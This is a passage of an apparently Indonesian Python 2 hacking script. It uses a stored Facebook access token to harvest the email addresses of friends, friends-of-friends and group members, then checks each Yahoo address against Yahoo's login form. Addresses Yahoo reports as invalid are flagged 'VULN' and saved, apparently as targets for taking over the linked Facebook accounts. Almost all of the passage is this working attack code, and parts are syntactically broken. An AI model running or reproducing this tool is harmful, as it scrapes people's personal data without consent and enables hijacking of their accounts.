    save = open('out/MailVuln.txt', 'w')
    load('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;96mGetting email friend \x1b[1;92m')
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr = 0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\n\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + nama
                    berhasil.append(mail)
                
        continue
        except KeyError:
            continue
        

    
    print '%s\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % putih
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/MailVuln.txt'
    save.close()
    raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
    menu_yahoo()


def yahoofromfriends():
    global toket
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    print 
    mpsh = []
    jml = 0
    idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
    
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
    except KeyError:
        print '\x1b[1;91m[!] Friend not found'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        menu_yahoo()

    teman = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('out/FriendMailVuln.txt', 'w')
    load('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;96mGetting email from friend \x1b[1;92m...')
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr = 0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\n\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + nama
                    berhasil.append(mail)
                
        continue
        except KeyError:
            continue
        

    
    print '%s\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % putih
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/FriendMailVuln.txt'
    save.close()
    raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
    menu_yahoo()


def yahoomember():
    global toket
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    print 
    mpsh = []
    jml = 0
    id = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID group \x1b[1;91m:\x1b[1;97m ')
    
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
        asw = json.loads(r.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom group \x1b[1;91m:\x1b[1;97m ' + asw['name']
    except KeyError:
        print '\x1b[1;91m[!] Group not found'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        menu_yahoo()

    teman = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('out/GrupMailVuln.txt', 'w')
    load('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;96mGetting email from group \x1b[1;92m')
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr = 0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\n\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + nama
                    berhasil.append(mail)
                
        continue
        except KeyError:
            continue
        

    
    print '%s\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % putih
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/GrupMailVuln.txt'
    save.close()
    raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
    menu_yahoo()


def yahoolist():
    global toket
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    print 
    files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile path \x1b[1;91m: \x1b[1;97m')
    
    try:
        total = open(files, 'r')
        mail = total.readlines()
    except IOError:
        print '\x1b[1;91m[!] File not found'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        menu_yahoo()

    mpsh = []
    jml = 0
    load('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;96mStart \x1b[1;92m')
    save = open('out/FileMailVuln.txt', 'w')
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr = 0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            
            try:
                pek = jok.search(klik).group()
            except:
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\n\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail
                berhasil.append(mail)
            
    print '%s\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % putih
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/FileMailVuln.txt'
    save.close()
    raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
    menu_yahoo()


def status():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    print 
    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mType status \x1b[1;91m:\x1b[1;97m ')
    if msg == '':
        print "\x1b[1;91m[!] Don't be empty"
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        menu()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        load('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;96mCreate \x1b[1;92m')
        print '\n\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        menu()

if __name__ == '__main__':
    login()
